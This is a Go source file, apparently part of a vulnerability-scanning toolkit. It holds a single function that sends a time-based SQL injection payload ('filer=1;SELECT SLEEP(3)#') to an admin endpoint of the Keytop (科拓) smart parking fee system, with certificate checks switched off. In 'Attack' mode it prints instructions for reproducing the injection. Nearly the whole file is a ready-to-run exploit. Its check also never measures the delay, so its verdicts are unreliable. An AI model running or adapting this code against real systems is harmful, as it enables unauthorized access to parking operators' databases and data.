package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func KTO_SQLInjection(url string, Attack bool) error {
	payload := "start=0&limit=20&filer=1;SELECT SLEEP(3)#"
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/KT_Admin/CarCard/DoubtCarNoListFrom.aspx", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "totalCount") {
		fmt.Println("[*]科拓全智能停车收费系统SQLInjection : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/KT_Admin/CarCard/DoubtCarNoListFrom.aspx，并传入请求体`start=0&limit=20&filer=1;SELECT SLEEP(3)#`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
